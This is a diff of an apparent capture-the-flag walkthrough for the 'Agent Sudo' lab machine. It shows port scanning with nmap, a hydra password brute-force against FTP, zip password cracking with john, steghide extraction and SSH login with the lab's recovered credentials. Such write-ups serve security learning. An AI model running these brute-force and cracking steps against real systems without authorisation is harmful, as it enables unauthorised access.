@@ -21,25 +21,16 @@ image:
   alt: Agent sudo
 ---
 
-# Agent Sudo
-
+### **Description**
 You found a secret server located under the deep sea.  
 Your task is to hack inside the server and reveal the truth.
 
-### Task 2: Enumerate
-### Task 3: Hash cracking and brute-force
-### Task 4: Capture the user flag  
-### Task 5: Privilege escalation
-
-
-
-## Enumerate
-### nmap
-
+### Port Scan
+We start off with a nmap scan to identify the open ports.
 ```sh 
 nmap -sV -sC -v 10.10.224.246
 ```
-
+From the scan we get three open ports.
 ```sh
 Scanning 10.10.224.246 [1000 ports]
 Discovered open port 22/tcp on 10.10.224.246
@@ -65,83 +56,56 @@ Discovered open port 80/tcp on 10.10.224.246
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
-
+We prioritized starting the investigation with the HTTP protocol on port 80.
 ### Http_80
-
- **ip**  `10.10.55.182`
-
-**To Do List**  
-- run gobuster
-- surf the web  
-- view source code  
-- robots.txt  
-- gobuster  
-
-```sh
-gobuster dir -u http://10.10.55.182 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
-### Result
-Nothing much 
-
-### surf the web
-
+Visiting the site we get:
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/1.png)
 
 Let's try spoofing as C and get the same URL with curl.  
 -A allows us to spoof the user agent and -L follows any redirects.
-
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/2.png)
-
 Now we have a user `chris` but not sure it's for ssh or ftp.
-
 ### ftp-21
-
-## bruteforce
+**Brute-force**
 ```sh
-hydra -L users.txt -P passwords.txt <IP> ftp 
-# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
+# hydra -L users.txt -P passwords.txt <IP> ftp 
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
 ```
 
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/3.png)
-
-## Result
-ftp details  
-- user name: chris  
-- password: crystal  
-log in!!!
+Now we have some valid credentials:
+- username: `chris`  
+- password: `crystal`
 ```sh
 ftp chris@10.10.55.182 
 ```
 
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/4.png)
 
-
-we got the file, concatenate it:  
+we get the file and read  the contents:
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/5.png)
 
-
-Will have to go back and get the images. We run binwalk on the png file which is the most likely to contain some hidden files.
-
+Will have to go back and get the images. We run `binwalk` on the `png` file which is the most likely to contain some hidden files.
 We get these three files:
-i
 - 365  
 - 365.zlib  
 - 8702.zip  
 - To_agentR.txt  
 
 The zip file is encrypted. We can use john to crack the password:
-
 ```sh
+# convert the file to format that john can understand
 zip2john 8702.zip > forjohn
+
+# now we let John do his thing
 john forjohn.txt
 ```
 
 ![](../assets/img/try_hack_me/Easy/Agent_sudo/6.png)
 
-Password = alien  
+Password = `alien`  
 Unzip the files. 
- 
-You may get errors extracting the files using unzip, if so, use 7z e `zipfile`
+ You may get errors extracting the files using unzip, if so, use 7z e `zipfile`
 ```sh
  7z e 8702.zip
  ```  
@@ -150,8 +114,12 @@ Use `CyberChef` to decode
 `QXJlYTUx` = `Area51` = password for `steg`.  
 We can now use `steghide` on the image that we never used.
 ```sh
+# Use this command to check if we have any hiden msg
 steghide info cute-alien.jpg 
+
+# then we use the extract command 
 steghide extract -sf cute-alien.jpg 
+
 cat message.txt
 ```
 
@@ -164,7 +132,6 @@ With these details and the unused port (22 = ssh), we can try logging in.
 Details 
 - username: `james`
 - password: `hackerrules!`
-
 ```sh
  ssh james@10.10.55.182 
 # password = hackerrules!
